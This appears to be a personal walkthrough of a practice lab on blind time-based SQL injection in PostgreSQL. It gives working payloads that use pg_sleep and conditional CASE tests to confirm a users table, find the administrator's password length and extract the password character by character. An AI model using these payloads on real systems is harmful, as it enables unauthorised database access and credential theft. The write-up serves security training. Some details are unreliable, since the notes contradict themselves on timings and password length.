```
' || (select pg_sleep(10))--
```
Confirm that it has time based sql injection since it repsonse in 10,000 milisecond

Confirm that the users table exists in the database
When 1=1 than sleep for 10 seconds else don't sleep at all. Used end to end the if else statement
```
' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
```

Testing if case is false (shouldn't sleep)
```
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
```


Check if user table exist in database 
Confirm that the user table exist and the administrator username exist in the users table. If the condition is true than you will get a 10 second delay if not than it won't sleep 
```
' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
```

To find the password we need to find out the length first 
```
' || (select case when (username='administrator' and length(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)--
```

Disable resource pool or else it going to mess up our time based sql injection 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7c51e583-9762-434b-8013-25bdb85b5f5f)




Response completed in 10 milliseconds which show that out case statement is true so the password is 20 characters 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/57cab11a-ebea-4e53-a256-970309451ea2)

We have length now we need to enumerate the password 

```
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
```


10 second response on letter r
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/847029b9-3da2-4cb2-aa91-644fa4406c44)



Finding whole password
Filter by response received and load up on excel and order by least to greatest to get password
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/14dbfd43-443a-4a17-ac00-7e8afd9780cc)



